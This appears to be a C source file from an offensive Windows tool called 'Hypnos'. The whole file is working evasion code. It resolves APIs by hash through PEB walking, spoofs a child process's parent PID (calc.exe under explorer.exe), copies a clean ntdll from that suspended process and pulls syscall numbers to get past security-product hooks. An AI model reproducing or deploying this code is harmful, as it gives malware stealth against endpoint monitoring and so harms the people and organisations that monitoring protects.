#include <stdlib.h>

#include "includes/hypnos.h"
#include "includes/Native.h"

#pragma region GlobalVariables

HANDLE mainThread;
HANDLE hNtdllCopy;

#pragma endregion

#pragma region PatternMatching

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

#pragma region PebParsing

unsigned long djb2_hash(const char* str) {
    unsigned long hash = 5381;
    int c;

    while ((c = *str++))
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

    return hash;
}

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
         pListEntry != &peb->Ldr->InMemoryOrderModuleList;
         pListEntry = pListEntry->Flink)
    {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
    // Getting DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    // Getting NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);

    *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
}

void* GetSymbolAddress(PVOID imageBase, unsigned long toFind) {
    PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
    Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);

    PDWORD pdwFunctionNames = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNames);
    PDWORD pdwFunctionAddresses = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfFunctions);
    PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNameOrdinals);

    // Walking over exported functions
    for (int i = 0; i < pNtdllExportDirectory->NumberOfNames; i++) {
        // Grabbing function name and function address
        char* pFunctionName = (char*)((PBYTE)imageBase + pdwFunctionNames[i]);
        void* pFunctionAddress = (PBYTE)imageBase + pdwFunctionAddresses[pwAddressOfNameOrdinals[i]];

        if (djb2_hash(pFunctionName) == toFind) return pFunctionAddress;
    }

    return NULL;
}

#pragma endregion

DWORD FindProcess(LPCSTR name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 processentry32;
    processentry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processentry32)) return -1;

    do {
        if (strcmp(processentry32.szExeFile, name) == 0) {
            return processentry32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processentry32));

    return -1;
}

HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName) {
    DWORD parentPid = FindProcess(parentName);
    STARTUPINFOEXA startUpInfo;
    PROCESS_INFORMATION processInformation;
    SIZE_T attributeSize;
    SecureZeroMemory(&startUpInfo, sizeof(startUpInfo));
    SecureZeroMemory(&processInformation, sizeof(processInformation));

    HANDLE parentHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, parentPid);

    // Setting up attributes to spoof PPID
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    startUpInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(startUpInfo.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(startUpInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);
    startUpInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Now, we can create the child process
    BOOL res = CreateProcessA(NULL, (LPSTR)toSpawn, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                              NULL, NULL, &startUpInfo.StartupInfo, &processInformation);

    if (res) {
        printf("[+] Spoofed PPID of %s to %s at %lu\n", toSpawn, parentName, parentPid);
    }

    return processInformation.hProcess;
}

void* GetNtdllCopy() {
    // Gets a HANDLE to NTDLL via suspended process method
    HANDLE childHandle = SpoofProcessPPID("calc.exe", "explorer.exe");
    if (childHandle == INVALID_HANDLE_VALUE) {
        printf("[!] Could not create child process\n");
        return NULL;
    }

    // Parsing headers from NTDLL
    HMODULE moduleNtdll = GetModuleHandleA("ntdll");
    PIMAGE_DOS_HEADER ntdllDosHeader =(PIMAGE_DOS_HEADER)moduleNtdll;
    PIMAGE_NT_HEADERS  ntdllNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllDosHeader + (BYTE)ntdllDosHeader->e_lfanew);
    DWORD ntdllSize = ntdllNtHeaders->OptionalHeader.SizeOfImage;

    LPVOID ntdllCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ntdllSize);
    if (!ReadProcessMemory(childHandle, moduleNtdll, ntdllCopy, ntdllSize, NULL)) {
        printf("[!] Could not read process memory to ntdllCopy, %d\n", GetLastError());
        return NULL;
    }

    WaitForSingleObjectEx(GetCurrentProcess(), 2000, TRUE);
    TerminateProcess(childHandle, 0);

    return ntdllCopy;
}

WORD GetSyscallNumber(void* addr) {
    return (WORD)*((PBYTE)addr + 4);
}

BOOL InitHypnos() {
    // Getting current thread, and handle to clean copy of NTDLL
    mainThread = GetCurrentThread();
    hNtdllCopy = GetNtdllCopy();

}